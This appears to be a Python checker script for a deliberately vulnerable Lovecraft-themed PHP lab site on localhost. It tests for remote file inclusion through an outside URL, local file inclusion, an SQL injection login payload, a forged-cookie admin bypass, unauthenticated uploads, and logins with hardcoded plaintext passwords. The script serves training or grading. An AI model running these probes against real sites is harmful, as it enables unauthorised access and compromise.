import requests
from paramiko import SSHClient

WILBUR = "http://localhost:8082"

KNOWN_USERS =     users = [
        {
            "user": "wilburwhateley",
            "pass": "+yog_sototh"
        },
        {
            "user": "lavinia",
            "pass": "Ad9XPzFTEf"
        },
        {
            "user": "herbwest",
            "pass": "bodies_just,so_many_bodies!"
        },
        {
            "user": "pickmann",
            "pass": "MyS3cr3t1sThatIUs3Phot0References"
        },
        {
            "user": "moncada",
            "pass": "dingdong"
        },
    ]

def test_login(username, password):
    data = {
        "fname": username,
        "fpass": password
    }
    res = requests.post(WILBUR + "/login.php", data=data)
    if "logged in" in res.text:
        return True
    return False

def main():
    # Check for info.php
    res = requests.get(WILBUR + "/info.php")
    if res.status_code == 200:
        print("✅ Leaked info.php")

    # Check if local file inclusion is possible
    res = requests.get(WILBUR + "/blog.php?file=blog.php")
    lfi = ";" in res.text or "$" in res.text
    if lfi:
        print("✅ Local file inclusion possible")
    
     # Check if remote file inclusion is possible
    res = requests.get(WILBUR + "/blog.php?file=http://cirt.net/rfiinc.txt")
    rfi = "phpinfo" in res.text
    if rfi:
        print("✅ Remote file inclusion possible")

    # Check for directory access
    for url in [WILBUR+"/secretTexts", WILBUR+"/dir"]:
        res = requests.get(url)
        if res.status_code == 200 and "Apache" in res.text:
            print("✅ Found directory access at "+ url)

    # Check for login cookie
    session = requests.Session()
    session.cookies.set("logged_in", "any")
    res = session.get(WILBUR+"/admin.php")
    if "Select html" in res.text:
        print("✅ Use 'logged_in' cookie with any value logs in at /admin.php")

    # Check for sql injection
    sql_user = "' or 1=1;--"
    sql_pass = "pass"
    if test_login(sql_user, sql_pass):
        print("✅ SQL injection in 'login.php' still possible")
    
    # Check if one can post files without permissions
    data = {
        "submit": "any",
    }
    session = requests.Session()
    session.cookies.set("logged_in", "any")
    res = session.post(WILBUR + "/admin.php", data=data)
    if "file was not uploaded" in res.text:
        print(f"✅ You can upload files without authentication via admin.php")

    # Check if one can post files without permissions
    data = {
        "submit": "any",
    }
    session = requests.Session()
    session.cookies.set("logged_in", "any")
    res = session.post(WILBUR + "/backupblog.php", data=data)
    if "file was not uploaded" in res.text:
        print(f"✅ You can upload files without authentication via backupblog.php")


    # Check for user login
    for user in KNOWN_USERS:
            if test_login(user["user"], user["pass"]):
                print(f"✅ Successful login in via 'login.php' as user {user['user']}")






    


if __name__=="__main__":
    try:
        main()
    except requests.ConnectionError:
        print("Could not reach " + WILBUR)